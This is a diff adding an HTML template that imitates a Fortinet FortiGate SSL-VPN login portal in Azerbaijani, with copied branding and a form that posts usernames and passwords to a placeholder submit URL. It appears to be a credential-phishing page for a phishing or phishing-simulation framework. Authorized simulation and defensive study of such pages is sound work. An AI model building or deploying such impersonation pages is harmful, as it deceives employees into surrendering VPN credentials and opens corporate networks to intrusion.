@@ -1,0 +1,59 @@
+<!doctype html>
+<html lang="az">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SSL-VPN Portal</title>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;font-family:'Segoe UI',Roboto,Arial,sans-serif;
+       background:#e9edf2;background-image:linear-gradient(180deg,#eef2f6,#dde3ea);
+       color:#1b2733;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
+  .card{width:100%;max-width:396px;background:#fff;border-radius:10px;overflow:hidden;
+        box-shadow:0 12px 40px rgba(20,30,45,.18);border:1px solid #d7dee6}
+  .brand{text-align:center;padding:30px 32px 6px}
+  .mark{display:inline-flex;align-items:center;gap:9px}
+  .mark svg{width:30px;height:30px}
+  .mark .wm{font-size:22px;font-weight:800;color:#2b2f33;letter-spacing:-.3px}
+  .mark .wm b{color:#da291c;font-weight:800}
+  .sslvpn{margin:14px 0 0;font-size:13px;color:#8a97a5;letter-spacing:2px;text-transform:uppercase}
+  .body{padding:18px 34px 30px}
+  .please{font-size:15px;color:#43596b;text-align:center;margin:0 0 18px}
+  label{display:block;font-size:12.5px;font-weight:600;color:#43596b;margin:14px 0 6px}
+  input{width:100%;padding:11px 13px;font-size:15px;border:1px solid #cdd6df;border-radius:7px;outline:none;transition:.15s}
+  input:focus{border-color:#da291c;box-shadow:0 0 0 3px rgba(218,41,28,.12)}
+  .btn{width:100%;margin-top:22px;padding:12px;font-size:15px;font-weight:600;color:#fff;
+       background:#da291c;border:none;border-radius:7px;cursor:pointer;transition:.15s}
+  .btn:hover{background:#b72015}
+  .launch{margin-top:16px;text-align:center;font-size:12.5px}
+  .launch a{color:#da291c;text-decoration:none}
+  .foot{text-align:center;font-size:11px;color:#9aa4b2;padding:14px;background:#f6f8fb;border-top:1px solid #eef1f5}
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="brand">
+      <div class="mark">
+        <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M3 7l13-4 13 4v8c0 8-6.2 12.8-13 16C9.2 27.8 3 23 3 15V7z" fill="#da291c"/>
+          <path d="M11 11h10v3.2h-6.2v2.4H20v3.1h-5.2V25H11V11z" fill="#fff"/>
+        </svg>
+        <span class="wm">Forti<b>net</b></span>
+      </div>
+      <div class="sslvpn">SSL-VPN Portal</div>
+    </div>
+    <div class="body">
+      <p class="please">Zəhmət olmasa hesabınızla daxil olun</p>
+      <form action="{{.SubmitURL}}" method="post" autocomplete="off">
+        <label for="u">İstifadəçi adı</label>
+        <input id="u" name="username" type="text" placeholder="ad.soyad" required autofocus>
+        <label for="p">Parol</label>
+        <input id="p" name="password" type="password" placeholder="••••••••" required>
+        <button class="btn" type="submit">Daxil ol</button>
+      </form>
+      <p class="launch"><a href="#">FortiClient tətbiqini başlat →</a></p>
+    </div>
+    <div class="foot">© 2026 Fortinet, Inc. · FortiGate SSL-VPN</div>
+  </div>
+</body>
+</html>
